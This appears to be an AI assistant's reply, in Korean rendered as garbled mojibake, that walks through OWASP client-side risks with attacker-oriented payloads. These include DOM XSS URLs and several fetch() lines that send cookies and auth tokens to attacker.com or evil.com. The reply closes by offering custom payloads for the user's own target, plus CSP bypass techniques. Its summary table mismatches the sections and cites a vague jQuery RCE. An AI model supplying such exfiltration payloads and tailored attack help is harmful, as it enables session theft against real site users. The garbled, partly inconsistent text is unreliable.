ì¢‹ìŠµë‹ˆë‹¤!
ë‹¹ì‹ ì´ ì–¸ê¸‰í•œ **OWASP Top 10 Client-Side Security Risks**ë¥¼ ì°¸ê³ í•´ì„œ, í˜„ì‹¤ì ì¸ ê³µê²© ì‹œë‚˜ë¦¬ì˜¤ì™€ í•¨ê»˜ ê° í•­ëª© ì¤‘ ëª‡ ê°€ì§€ ì£¼ìš” í•­ëª©ì— ëŒ€í•´ ì‹¤ì œë¡œ **ì‚¬ìš© ê°€ëŠ¥í•œ í˜ì´ë¡œë“œ ì˜ˆì‹œ**ë¥¼ ì•„ë˜ì— ì •ë¦¬í•´ë“œë¦´ê²Œìš”.

íŠ¹íˆ, **ì‹¤ì œ ê³µê²©ìê°€ ì‚¬ìš©í•  ìˆ˜ ìˆëŠ” í˜ì´ë¡œë“œë¥¼ ì¤‘ì‹¬**ìœ¼ë¡œ êµ¬ì„±í•˜ë˜, êµìœ¡ì  ëª©ì ì— ë¶€í•©í•˜ê²Œ ì„¤ëª…í•´ë“œë¦½ë‹ˆë‹¤.

---

## âœ… 1. **DOM-based XSS**

> í´ë¼ì´ì–¸íŠ¸ ì‚¬ì´ë“œì—ì„œ JavaScriptê°€ DOM ì¡°ì‘ì„ í†µí•´ ê³µê²© ê°€ëŠ¥í•  ë•Œ ë°œìƒ

### ğŸ“Œ ì˜ˆì œ ì½”ë“œ (ì·¨ì•½):

```javascript
const q = new URLSearchParams(location.search).get("search");
document.getElementById("result").innerHTML = "You searched for: " + q;
```

### ğŸ§¨ í˜ì´ë¡œë“œ:

```url
https://example.com/page?search=<img src=x onerror=alert(1)>
```

### ğŸ’¥ ê²°ê³¼:

* `<img>` íƒœê·¸ê°€ ì‚½ì…ë˜ë©° `onerror=alert(1)` ì‹¤í–‰
* ë¸Œë¼ìš°ì €ì—ì„œ **ì§ì ‘ ì‹¤í–‰**ë˜ëŠ” **í´ë¼ì´ì–¸íŠ¸ ì‚¬ì´ë“œ XSS**

---

## âœ… 2. **Sensitive Data Stored Client-Side**

> ë¡œì»¬ìŠ¤í† ë¦¬ì§€, ì„¸ì…˜ìŠ¤í† ë¦¬ì§€, ì¿ í‚¤ ë“±ì— ë¯¼ê°í•œ ë°ì´í„°ë¥¼ ì €ì¥í•  ê²½ìš°

### ğŸ“Œ ì˜ˆì œ ì½”ë“œ (ì·¨ì•½):

```javascript
localStorage.setItem("auth_token", "secret-jwt-token");
```

### ğŸ§¨ ê³µê²©ì í˜ì´ë¡œë“œ (ì½˜ì†”ì—ì„œ):

```javascript
alert(localStorage.getItem("auth_token"));
```

ë˜ëŠ” ì•…ì„± ìŠ¤í¬ë¦½íŠ¸ê°€ ì‚½ì…ë  ê²½ìš°:

```html
<script>fetch("https://attacker.com/steal?token=" + localStorage.getItem("auth_token"))</script>
```

### ğŸ’¥ ê²°ê³¼:

* ì‚¬ìš©ìì˜ ì¸ì¦ í† í° íƒˆì·¨
* ì„¸ì…˜ íƒˆì·¨ ë° ê¶Œí•œ ìƒìŠ¹ ê°€ëŠ¥

---

## âœ… 3. **Not Using Standard Browser Security Controls**

> CSP ë¯¸ì‚¬ìš©, iframe sandbox ë¯¸ì ìš© ë“±ìœ¼ë¡œ ì¸í•´ XSSë‚˜ í´ë¦­ì¬í‚¹ì— ì·¨ì•½

### ğŸ“Œ ì˜ˆ: CSPê°€ ì—†ëŠ” í˜ì´ì§€

### ğŸ§¨ í˜ì´ë¡œë“œ:

```html
<script src="https://evil.com/malware.js"></script>
```

* CSPê°€ ìˆë‹¤ë©´ `script-src 'self'`ë¡œ ì™¸ë¶€ ìŠ¤í¬ë¦½íŠ¸ ë¡œë”© ì°¨ë‹¨ ê°€ëŠ¥
* ì—†ìœ¼ë©´ ì™¸ë¶€ ì•…ì„± JS ì‚½ì…í•˜ì—¬ ë°ì´í„° íƒˆì·¨, í‚¤ë¡œê¹… ë“± ê°€ëŠ¥

### ğŸ’¥ ê²°ê³¼:

* ì‚¬ì´íŠ¸ì— ì•…ì„± ì½”ë“œê°€ ì‚½ì…ë˜ì–´ ëª¨ë“  ì‚¬ìš©ìì— ëŒ€í•´ XSS ì‹¤í–‰ë¨

---

## âœ… 4. **Including Proprietary Information on the Client-Side**

> JS íŒŒì¼ì— ë‚´ë¶€ ì•Œê³ ë¦¬ì¦˜, ì¸ì¦ í‚¤, ë¹„ê³µê°œ ë¡œì§ì´ í¬í•¨ë˜ì–´ ìˆì„ ë•Œ

### ğŸ“Œ ì˜ˆì œ ì½”ë“œ:

```javascript
// Don't share this!
const secret_api_key = "sk-1234567890abcdef";
```

### ğŸ§¨ ê³µê²© ë°©ë²•:

* ë¸Œë¼ìš°ì € ê°œë°œì ë„êµ¬ì—ì„œ `main.js`, `bundle.js` ë“± í™•ì¸
* ë˜ëŠ” JS íŒŒì¼ì„ `curl` ë˜ëŠ” `wget`ìœ¼ë¡œ ë¶„ì„

```bash
curl https://example.com/assets/app.js | grep 'secret_api_key'
```

### ğŸ’¥ ê²°ê³¼:

* ê³µê²©ìëŠ” API í‚¤ íƒˆì·¨ â†’ ë°±ì—”ë“œ ì„œë¹„ìŠ¤ ì•…ìš©, ìš”ê¸ˆ ë°œìƒ

---

## âœ… 5. **Broken Client-side Access Control**

> í´ë¼ì´ì–¸íŠ¸ì—ì„œ ë²„íŠ¼, ë§í¬, í˜ì´ì§€ ë…¸ì¶œì„ ìˆ¨ê²¼ì§€ë§Œ ì‹¤ì œë¡œ ì œì–´í•˜ì§€ ì•ŠëŠ” ê²½ìš°

### ğŸ“Œ ì˜ˆì œ ì½”ë“œ (ì·¨ì•½):

```html
<!-- ê´€ë¦¬ìë§Œ ë³´ì´ê²Œ ì²˜ë¦¬ -->
<button style="display:none" onclick="deleteUser(1)">Delete</button>
```

### ğŸ§¨ ê³µê²©ì í–‰ë™:

* ê°œë°œì ë„êµ¬ë¡œ ìˆ¨ê²¨ì§„ ë²„íŠ¼ ë³´ì´ê²Œ ì„¤ì •:

```javascript
document.querySelector('button[onclick="deleteUser(1)"]').style.display = "block";
```

* í´ë¦­í•˜ì—¬ ê´€ë¦¬ì ê¸°ëŠ¥ ì‚¬ìš©

### ğŸ’¥ ê²°ê³¼:

* ì‚¬ìš©ì ê¶Œí•œ ìš°íšŒ ê°€ëŠ¥
* ê´€ë¦¬ì ê¸°ëŠ¥ì— ì ‘ê·¼ ê°€ëŠ¥

---

## âœ… 6. **JavaScript Drift**

> ì˜ë„í•˜ì§€ ì•Šì€ JS ì½”ë“œ ë³€ê²½ì´ ë°œìƒí•´ë„ íƒì§€í•˜ì§€ ëª»í•¨

### ğŸ§¨ ê³µê²© ì‹œë‚˜ë¦¬ì˜¤:

* ê³µê²©ìê°€ ì¤‘ê°„ì ê³µê²© ë“±ìœ¼ë¡œ JSë¥¼ ë³€ê²½
* ìƒˆë¡œìš´ JSê°€ `window.onload`ì— ì•…ì„± ì½”ë“œ ì£¼ì…

```javascript
window.onload = function () {
  fetch("https://attacker.com/log?cookie=" + document.cookie);
};
```

* ì •ì  ìì‚° ë¬´ê²°ì„± ê²€ì¦(SRI) ì—†ìœ¼ë©´ ë°©ì–´ ë¶ˆê°€

---

## âœ… 7. **Lack of Third-party Origin Control**

### ğŸ“Œ ì˜ˆì œ:

```html
<script src="https://cdn.untrustedcdn.com/lib.js"></script>
```

### ğŸ§¨ ê³µê²©:

* `untrustedcdn.com`ì´ ë§Œì•½ ê³µê²©ìì—ê²Œ ì¥ì•…ë˜ë©´,
  ë¼ì´ë¸ŒëŸ¬ë¦¬ ë‚´ë¶€ì— ë‹¤ìŒê³¼ ê°™ì´ ì•…ì„± ì½”ë“œ ì‚½ì…:

```javascript
fetch("https://evil.com/steal?cookie=" + document.cookie);
```

### ğŸ’¥ ê²°ê³¼:

* ê³µê²©ìê°€ **ì‚¬ì´íŠ¸ ì „ì²´ ì‚¬ìš©ìì˜ ì¿ í‚¤ íƒˆì·¨** ê°€ëŠ¥

---

## ğŸ§ª ë³´ë„ˆìŠ¤: ì¢…í•© í˜ì´ë¡œë“œ (DOM XSS + Storage íƒˆì·¨)

```html
<script>
  fetch("https://attacker.com/?data=" + encodeURIComponent(localStorage.getItem("auth_token")));
</script>
```

ë˜ëŠ” URLë¡œ ì‚½ì… ì‹œ:

```
https://example.com/page?msg=<script>fetch('https://attacker.com?cookie='+document.cookie)</script>
```

â†’ CSP, ì…ë ¥ í•„í„°ë§ì´ ì—†ë‹¤ë©´ **100% ì‹¤í–‰ë¨**

---

## ğŸ” ìš”ì•½: OWASP Client-Side Top 10ì— ëŒ€ì‘í•˜ëŠ” ì‹¤ì œ ê³µê²© ë°©ì‹

| í•­ëª©                               | ê³µê²©ì ì‹œë‚˜ë¦¬ì˜¤        | ì‹¤ì œ í˜ì´ë¡œë“œ ì˜ˆ                                                    |
| -------------------------------- | --------------- | ------------------------------------------------------------ |
| 1. Broken Access Control         | ìˆ¨ê²¨ì§„ ê¸°ëŠ¥ ì‹¤í–‰       | `display:none` ìš”ì†Œ ì¡°ì‘                                         |
| 2. DOM-based XSS                 | URL ê¸°ë°˜ DOM ì¡°ì‘   | `<img src=x onerror=alert(1)>`                               |
| 3. Sensitive Data Leakage        | ì¿ í‚¤/í† í° ì „ì†¡        | `fetch('https://attacker.com?d='+localStorage.getItem(...))` |
| 4. Outdated Components           | jQuery ì·¨ì•½ ë²„ì „ ì‚¬ìš© | `jQuery.fn.init()` RCE ë“±                                     |
| 5. Origin Control ì—†ìŒ             | CDN ì•…ì„± ì½”ë“œ       | `<script src="evilcdn.com">`                                 |
| 6. JS Drift                      | ì½”ë“œ ë³€ê²½ íƒì§€ ì‹¤íŒ¨     | ë³€ì¡°ëœ `main.js` ì‹¤í–‰                                             |
| 7. Client-side Storage           | API Key ë…¸ì¶œ      | `localStorage.setItem("key", ...)`                           |
| 8. Logging ë¶€ì¡±                    | ë³€ê²½ íƒì§€ ì‹¤íŒ¨        | ì¡°ìš©í•œ ê³µê²© ì§€ì†                                                    |
| 9. Browser Security Controls ë¯¸ì‚¬ìš© | CSP ì—†ìŒ          | `<script src="evil.com">`                                    |
| 10. Proprietary Info             | JSì— ë¡œì§ ë…¸ì¶œ       | `const apiKey = "secret"`                                    |

---

## âœ… ë‹¤ìŒ ë‹¨ê³„ ì¶”ì²œ

* ë‹¹ì‹ ì´ ì§ì ‘ í…ŒìŠ¤íŠ¸í•´ë³´ê³  ì‹¶ì€ **íƒ€ê¹ƒ ì½”ë“œë‚˜ í™˜ê²½**ì´ ìˆë‹¤ë©´, ë§ì¶¤í˜• í˜ì´ë¡œë“œ ì„¤ê³„í•´ë“œë¦´ ìˆ˜ ìˆì–´ìš”.
* CSP ìš°íšŒ, double encoding, DOM sink ë¶„ì„ ë“± ê³ ê¸‰ ê³µê²© ê¸°ë²•ë„ í•„ìš”í•˜ì‹œë©´ ì•Œë ¤ì£¼ì„¸ìš”.

ì–¸ì œë“ ì§€ ë” ê¹Šì´ ë“¤ì–´ê°€ë„ ì¢‹ìŠµë‹ˆë‹¤.
